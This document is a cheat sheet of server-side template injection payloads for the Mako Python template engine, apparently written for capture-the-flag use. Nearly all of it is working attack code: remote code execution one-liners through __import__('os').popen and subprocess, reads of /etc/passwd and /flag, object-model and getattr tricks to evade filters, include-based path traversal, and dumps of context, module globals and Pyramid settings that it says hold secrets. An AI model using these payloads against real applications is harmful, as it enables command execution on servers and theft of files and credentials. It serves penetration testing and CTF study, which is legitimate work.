# Mako — Python template engine

Marker: `${7*7}` → 49. Mako is Python — `${}` evaluates PYTHON
expressions directly, `<% %>` is raw Python. The escape surface is
the full language.

---

## 1. Confirm

```mako
${7*7}                  → 49
${'a'.upper()}          → A — python exprs work
<% x=7*7 %>${x}         → 49
${self.name()}          -- mako self-object
${context.keys()}       -- all bound vars
${context.get('x')}     -- context access
${request.params}       -- request if bound (Pyramid/Pylons)
```

---

## 2. The direct-RCE — `${}` is full Python

```mako
${__import__('os').popen('id').read()}
${__import__('os').system('id')}
${__import__('os').popen('cat /flag').read()}
${__import__('subprocess').check_output('id',shell=True)}
${open('/flag').read()}
${open('/etc/passwd').read()}
${globals()}            -- all globals
${dir()}                -- namespace listing
${vars()}
```

Mako has NO sandbox by default — `${__import__(...)}` is the
one-liner. `open()` reads files directly.

---

## 3. The `<% %>` statement context

```mako
<% import os; os.popen('id') %>
<% import os; x=os.popen('id').read() %>${x}
<%! import os %>           -- <%! %> = module-level decl
<% page expr=x %>
```

`<% %>` runs Python statements — need `${}` or an explicit output
to see results. `<%! %>` is module-level (imports once).

---

## 4. The filter/wrapper bypasses — when `__import__` blocked

```mako
${().__class__.__mro__[1].__subclasses__()}       -- object-model walk
${''.__class__.__mro__[1].__subclasses__()[N]
   .__init__.__globals__['os'].popen('id').read()}
${getattr('', '__class__')}                       -- attr via getattr
${getattr('','__cl'+'ass__')}                     -- concat
${''['__class__']}                                 -- item-access? —
                                             str has no __getitem__
${''|attr('__class__')}                            -- no attr filter —
                                             mako uses ${} only —
                                             use getattr()
```

Mako is less filterable than Jinja because `${}` is raw Python —
filter bypasses use getattr/getitem/importlib:

```mako
${getattr(__import__('importlib'),'import_module')('os').popen('id').read()}
${__builtins__['__import__']('os').popen('id').read()}
${().__class__.__base__.__subclasses__()}
```

---

## 5. The template-in-template — `<%include>`/`<%namespace>`

```mako
<%include file="/etc/passwd"/>      -- parse-as-template — error-leak
<%namespace file="/etc/passwd" import="*"/>
<%include file="../../../etc/passwd"/>
<%def name="x()">...</%def>          -- def blocks
```

---

## 6. The `page`/`context`/`loop` objects

```mako
${context}                          -- the render context — all vars
${context.keys()}
${context.get('flag')}              -- flag as context var
${self}                             -- the template object
${self.render_context}
${self.module}                      -- module globals!
${self.module.__dict__}
${loop.index}                       -- inside for loops
${page.args}                        -- page-level args
```

`${context}`/`${self.module.__dict__}` often hold the flag directly.

---

## 7. The quick sequence

```mako
${7*7}                              -- confirm
${__import__('os').popen('id').read()}  -- RCE direct
${open('/flag').read()}              -- file read direct
${context.keys()}                    -- enumerate vars
${self.module.__dict__}              -- module globals
${getattr('','__cl'+'ass__')}        -- filter-evade
```

---

## 8. Pyramid/Pylons bound objects

```mako
${request.params}          -- request bound
${request.registry.settings}   -- app settings — secrets!
${request.environ}
${session}
```

Pyramid/Pylons bind request/session — `.registry.settings` often
has the flag or keys.
